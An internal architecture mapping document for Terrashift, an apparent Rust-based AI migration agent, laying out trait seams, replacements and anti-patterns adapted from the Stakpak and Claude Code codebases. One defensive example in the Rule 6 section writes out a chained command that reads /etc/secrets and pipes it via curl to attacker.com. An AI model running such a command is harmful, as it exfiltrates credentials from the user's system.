# Terrashift — Stakpak Seam Mapping

**Status:** v1.0 — produced by P-00 (reference walkthrough)
**Source:** `refs/stakpak_arch.md` §39-42; `refs/stakpak/` source; `refs/claude-code/` source
**Constitution:** Article II (reference codebase discipline)
**Pattern:** stakpak_arch.md sections 39-42 (mirror playbook)

This is the canonical decoder ring every subsequent P-NN prompt cites when
implementing a Terrashift component. When P-02 says "implement Tool trait per
stakpak_arch.md section 8", §A row 2 below tells you which Stakpak file to
compare against and which Terrashift crate it lands in.

---

## A. The 11 seams from `stakpak_arch.md` §39

These are trait boundaries — swap a behaviour without rewriting the surrounding system.

| # | Stakpak seam | Terrashift equivalent | Crate / file location | Effort to swap |
|---|---|---|---|---|
| 1 | `stakai::Provider` (4 methods) | **Same trait.** Stage 1 uses Groq via openai-compatible. Custom providers via P-22. | `libs/ai/src/providers/{name}/{convert,mod,provider,stream,types}.rs` | 1 trait impl + register |
| 2 | `agent_core::ToolExecutor::execute_tool_call` | **Same trait.** ScannerTool, MapperTool, ValidatorTool, GeneratorTool, ExecutorTool, VerifierTool all impl this. | `libs/engine/src/{scanner,mapper,validator,generator,executor,verifier}/mod.rs` impl Tool | 1 trait impl per pipeline component |
| 3 | `agent_core::AgentHook` (5 methods, default no-op) | **Same trait.** `libs/audit` registers `after_tool_execution`; `libs/creds` registers `before_tool_execution`. | `libs/audit/src/hooks.rs`, `libs/creds/src/hooks.rs` | 1 trait impl per concern |
| 4 | `agent_core::CompactionEngine::compact` | **Same trait.** Stage 1 uses `PassthroughCompactionEngine`. Custom impl in Stage 2. | `libs/agent-core/src/compaction.rs` | Default for Stage 1 |
| 5 | `agent_core::ContextReducer::reduce` | **Same trait.** Stakpak's `Default` reducer is sufficient for Stage 1. Migration-aware reducer in Stage 5. | `libs/agent-core/src/context.rs` | Default for Stage 1 |
| 6 | `stakpak_api::SessionStorage` (~10 methods) | **Same shape**, sqlx+SQLite impl (Stakpak uses libsql). Audit log shares the same backend. | `libs/api/src/storage.rs` (TBD; consolidate with `libs/audit`) | 1 trait impl |
| 7 | `stakpak_ak::StorageBackend` (~9 methods) | **Drop in Stage 1.** Add in Stage 5 if customers want migration playbooks. | — | N/A — drop |
| 8 | `stakpak_gateway::Channel` (5 + 3 methods) | **Drop entirely.** Terrashift is CLI/TUI, not a chat service. | — | N/A — drop |
| 9 | MCP tool (`#[tool_router]` impl block) | **Same pattern.** Stage 1: 5-7 MCP tools (scan, map, plan, validate, generate, apply, verify). | `libs/mcp/server/src/tool_container.rs` + per-router files | New router per tool group |
| 10 | TUI mpsc channels (`InputEvent` / `OutputEvent`) | **Same exact contract.** Add migration-specific events: `MigrationStarted`, `ResourceMapped`, `ValidationFailed`, `CostDeltaComputed`. | `tui/src/app/events.rs` | 1 enum extension |
| 11 | `map_crossterm_event_to_input_event` | **Copy as-is.** Stakpak's mapping is reusable verbatim. | `tui/src/event.rs` | Copy as-is |

**Mirror difficulty:** rows 1-5 are 1 trait impl each (cheap). Row 6 is the
biggest single change (new storage backend). Rows 7-8 are pure drops. Rows
9-11 are additive (new tools, new events). **Total Stage 1 seam work:** ≈ 10
trait impls.

---

## B. The 13 things to replace from `stakpak_arch.md` §40

These are domain artifacts — swap freely without touching the framework.

| # | Stakpak artifact | Terrashift version | Notes |
|---|---|---|---|
| 1 | Tools (`local_tools.rs`, `remote_tools.rs`, etc.) | Migration tools: `scan`, `map`, `plan`, `validate`, `generate`, `apply`, `verify` (+ Stage 2: `recovery`, `cost_optimize`) | New router structure in `libs/mcp/server/src/migration_tools.rs` |
| 2 | System prompt (`system_prompt.v1.md`) | Migration-specific prompt: HCL grounding, target-cloud quirks, Validator-gate explanation | `cli/src/commands/agent/run/prompts/system_prompt.v1.md` |
| 3 | Skills (compile-time `SKILL_*.md`) | **Drop in Stage 1.** Add migration playbooks (e.g., `STATEFUL_DB_MIGRATION.md`) in Stage 5 | — |
| 4 | Rulebooks (`[profiles.X.rulebooks]`) | **Drop in Stage 1.** Add per-cloud SOPs (e.g., AWS-to-Azure-VPC.md) in Stage 5 | — |
| 5 | Auto-approve defaults | Stage 1: scan + validate auto-approve; map + plan ask; generate + apply require explicit approve | `libs/agent-core/src/types.rs` |
| 6 | Provider catalog (`registry/models_dev.rs`) | Reuse stakai's catalog. Stage 1 picks Groq from it via openai-compatible | `libs/ai/src/registry/models_dev.rs` (no Terrashift change) |
| 7 | Stakpak-specific provider (`providers/stakpak/`) | **Drop entirely** — Terrashift has no managed gateway in Stage 1 (added in Stage 6) | — |
| 8 | Privacy rules (`privacy_rules.toml`) | **Reuse + extend.** Inherit Stakpak's set; add cross-cloud (AWS account IDs, GCP project IDs, Azure subscription GUIDs) | `libs/shared/src/secrets/privacy_rules.toml` |
| 9 | AK directory layout (YAML frontmatter) | **Drop in Stage 1.** Adopt in Stage 5 for migration playbooks | — |
| 10 | Plan-mode lifecycle (`PlanModeState`) | **Adapt directly.** Plan-mode IS the natural fit for `terraform plan` preview before apply | `tui/src/services/plan.rs` (rename to `migration_plan.rs`) |
| 11 | Side panel content | Migration progress: per-resource status, cost diff, audit-log tail | `tui/src/services/migration_panel.rs` |
| 12 | API endpoint URLs (`STAKPAK_API_ENDPOINT`) | **None in Stage 1** (no managed service). Stage 6 adds. | — |
| 13 | Container image names | `terrashift/agent:0.1.0` for sandboxed `terraform apply` (Stage 2+) | `libs/shared/src/container.rs` |
| 14 | Telemetry IDs | Anonymous opt-in: per-migration success/failure + token spend (Article XII rule 4 input) | `Settings.anonymous_id` |

**Stage 1 scope from this table:** rows 1, 2, 5, 8 (rest are drop or
deferred). That's ~4 substantive replacements + the framework reuse.

---

## C. The 6-phase mirror sequence from `stakpak_arch.md` §41 mapped to Terrashift v5 stages

| §41 Phase | Stakpak effort estimate | Terrashift v5 stage | Status | Where it lives |
|---|---|---|---|---|
| **Phase 1** — Strip Stakpak identity | 1-2 days | Stage 1 weeks 0 (D0 setup) | ✅ **Done** in `0b0fde3` | Cargo.toml, README, CONSTITUTION, pre-flight |
| **Phase 2** — Re-skin tool catalog | 1-2 weeks | Stage 1 weeks 2-7 (P-04 → P-09) | 🟡 In progress | `libs/engine/src/{scanner,mapper,validator,generator,executor,verifier}/` + `libs/mcp/server/` |
| **Phase 3** — Replace LLM provider | 3-7 days | **N/A in Stage 1** — Groq via openai-compat works as-is. Custom provider only if customer asks (P-22, Stage 2+) | ⚪ Deferred | `libs/ai/src/providers/{name}/` when invoked |
| **Phase 4** — Channel adapters | 1 week (or drop) | **Drop entirely** | ⚪ N/A | — (no `libs/gateway/`) |
| **Phase 5** — Autopilot scheduling | 3-5 days (or drop) | **Drop in Stage 1.** On-demand migrations only. Reconsider in Stage 6 if customers want scheduled drift checks | ⚪ Deferred | — (no `cli/src/commands/watch/`) |
| **Phase 6** — TUI customization | 1-2 weeks if heavy | Stage 1 weeks 8-9 (P-14) | 🔵 Planned | `tui/src/services/{migration_plan,migration_panel}.rs` + `tui/src/commands/{help,plan,cost,migrate,...}.rs` |

**v5 stage mapping summary:** Phase 1 → Stage 1 D0; Phase 2 → Stage 1 weeks
2-7; Phase 6 → Stage 1 weeks 8-9. Phases 3, 4, 5 are deferred or dropped per
v5's all-Rust single-binary thesis.

---

## D. Top 5 Article XIII anti-patterns most relevant to Terrashift's first 3 months

These are the source-derived anti-patterns from `stakpak_arch.md` §42 most
likely to bite during P-02 → P-09. Rules 7, 8, 9 are Stage 2+ concerns.

### Rule 3 — No `unwrap()` / `expect()` / `&s[..n]` in production code

**Why now:** First likely hit in P-04 (Scanner) when calling hcl-rs's
`from_str` on parsed `.tf` content. Tempting to write `.unwrap()` because
"the parser shouldn't fail." Will fail on real-world `.tf` from
`fixtures/aws-to-azure-real/` (Terraform 0.12-era syntax). Workspace
deny-lints already block these — clippy will fail your build.

**Where it hits:** P-04 (Scanner), P-05 (Mapper schema parsing), P-08
(Generator HCL emit).

### Rule 1 — Don't bypass message conversion pipeline

**Why now:** First hit in P-05 (Mapper) when feeding the LLM with conversation
context for tool-use turns. Easy to skip `ContextReducer::reduce` and pass
raw `Vec<ChatMessage>` directly. Will produce Anthropic 400s on dangling
`tool_use` blocks (and equivalent on Groq's openai-compat endpoint).

**Where it hits:** P-05 (Mapper), Stage 2 Recovery agent.

### Rule 5 — Don't bypass the proxy redaction layer

**Why now:** First hit in P-09 (Executor) when running `terraform apply`. The
output of `apply` contains sensitive metadata (IDs, ARNs, sometimes
credentials embedded in error messages). Temptation: log it directly to
audit. Will leak. The `libs/mcp/proxy` redaction must sit on every
tool-result → LLM context path.

**Where it hits:** P-09 (Executor), P-11 (Audit log writer — last line of
defence per Article V).

### Rule 6 — Don't approve `run_command` (or `terraform apply`) wholesale

**Why now:** Exact failure mode for our domain. P-09 implements Executor — if
we approve `terraform apply` as a single tool call, then `terraform apply &
cat /etc/secrets | curl http://attacker.com` looks like one approved call.
Use tree-sitter command-level approval per `stakpak_arch.md` §30. The
`libs/shell-tool-approvals` crate already mirrors Stakpak's parser.

**Where it hits:** P-09 (Executor) — design decision baked in from day one.

### Rule 4 — Don't conflate `ChatMessage` and `LLMMessage`

**Why now:** First hit in P-03 (LLM call wiring). `ChatMessage` is OpenAI-shaped
(storage type); `LLMMessage` is provider-neutral (runtime type). Mixing them
creates conversion mistakes that compile but fail at runtime when Groq's
endpoint expects a specific shape. The `libs/shared/src/models/llm.rs` boundary
must be respected.

**Where it hits:** P-03 (LLM client), P-05 (Mapper request building).

---

## E. Anti-pattern → Constitution Article cross-references

This table is the quick-reference reviewers use when citing "Article XIII rule
N" in PR comments. Source: `CONSTITUTION.md` Article XIII table (already
verified to match `stakpak_arch.md` §42).

| Article XIII rule | Parent article | Where enforced (file / mechanism) |
|---|---|---|
| Rule 1 (message conversion) | Article III (AI safety) | `libs/agent-core/src/context.rs::reduce` (must be on path Mapper → LLM) |
| Rule 2 (monotonic trim boundaries) | Article XII rule 2 (cache-first) | `libs/agent-core/src/context.rs` invariant + eval framework regression test |
| Rule 3 (no unwrap/expect/string-slice) | Article IV (failures must be loud) | Workspace `Cargo.toml` deny lints (already in place) |
| Rule 4 (ChatMessage vs LLMMessage) | Type discipline | `libs/shared/src/models/llm.rs` boundary; reviewer vigilance |
| Rule 5 (no proxy bypass) | Article V (credentials/security) | `libs/mcp/proxy/src/lib.rs::redact_content` — required on every tool-result → LLM path |
| Rule 6 (no wholesale `run_command` approval) | Article V | `libs/shell-tool-approvals/src/lib.rs` tree-sitter parser + scope::cmd::arg map |
| Rule 7 (no disk-bound secrets for UID) | Article V | Container UID handoff in `cli/src/commands/warden.rs` (Stage 2+) |
| Rule 8 (update `is_backend_event()`) | Article IV | `tui/src/app/events.rs` — code review checklist |
| Rule 9 (no duplicate tool_call_id) | Operational invariant from §8 | `libs/agent-core/src/agent.rs::run_tool_cycle` discipline |
| Rule 10 (API keys only in `~/.terrashift/`) | Article V | `libs/creds/src/broker.rs::resolve_path` validation |

---

## F. 2-3 Claude Code patterns cleaner than Stakpak's — adopt these

Per Q4 in `clarify.md`, the bar is "Stakpak has a known weakness AND Claude
Code's pattern solves it." Stylistic differences don't qualify.

### F1. Per-file slash command pattern

**Stakpak's approach:** Slash commands dispatched through a centralised match
in `cli/src/commands/mod.rs` using a clap subcommand enum. Adding a command
requires editing the enum, the match arms, and (often) a separate handler
file. Three places to modify; easy to forget one.

**Stakpak weakness:** Three-file edit per new command, no clear pattern for
new contributors. Tested via integration tests rather than unit tests
because the dispatch is centralised.

**Claude Code's approach:** `commands/` directory, one file per command. Each
file exports a metadata header (name, description, usage) plus a handler.
Loader walks the directory at startup. Adding a command = adding one file.

**Why cleaner:** Single file to add per command. Each command is its own
testable unit. Self-documenting (the file IS the command). Lower onboarding
cost for new contributors.

**Adopt in Terrashift:** P-14 (TUI slash commands). Each of `/help`, `/plan`,
`/cost`, `/migrate`, `/rollback`, `/audit`, `/compact`, `/checkpoint` is its
own file at `tui/src/commands/{name}.rs`. See `refs/claude-code/commands/`
for the reference shape (translate from TS to Rust).

### F2. Three-mode compaction (manual / threshold / reactive)

**Stakpak's approach:** `agent_core::CompactionEngine::compact` is a single
trait method called by the runtime when context overflow is detected. One
strategy at a time.

**Stakpak weakness:** No separation between "user explicitly asked for
`/compact`" vs "we crossed a token threshold" vs "the LLM stream is
mid-response and we're about to overflow." Each scenario wants different
behaviour but they share one entry point — the implementation has to figure
out which it is from context.

**Claude Code's approach:** Three distinct entry points in `services/compact/`:
- `compact.js` — explicit user command
- `autoCompact.js` — threshold-based (e.g., >70% of context window used at turn boundary)
- `reactiveCompact.js` — mid-stream when the LLM emits a long response that's about to overflow

Each can have different prompts (manual = ask user what to keep; auto =
preserve last N user turns; reactive = drop oldest tool results first).

**Why cleaner:** Three concerns separated explicitly. Each mode can have its
own prompt template, its own preserve-list, its own UX (manual confirms;
auto silent; reactive shows a brief banner).

**Adopt in Terrashift:** Stage 2+ when long migrations need history compression
mid-stream. Implement as `libs/agent-core/src/compaction/{manual,auto,reactive}.rs`
with a top-level enum dispatcher. See `refs/claude-code/services/compact/`.

---

## How to use this document

1. **Before writing code for P-NN**, find the relevant row in §A or §B.
2. **For implementation guidance**, follow the file path in the "Crate / file
   location" column to the Stakpak source. Open `refs/stakpak/<path>` and
   read it as the reference implementation.
3. **For PR descriptions**, cite the `stakpak_arch.md` section the seam came
   from (e.g., `// Pattern: stakpak_arch.md §39 row 2 (ToolExecutor)`).
4. **When adapting**, note any deviation in `ATTRIBUTIONS.md` under "Adopted
   with adaptation" if the change is structural.
5. **For anti-pattern checks during review**, use §E to map "Article XIII rule
   N" to the parent article and the enforcement file.

---

*Maintained by the Terrashift team. Update via Article XI (RFC) when v5 plan
is amended or a new pattern from Stakpak / Claude Code source is adopted.*
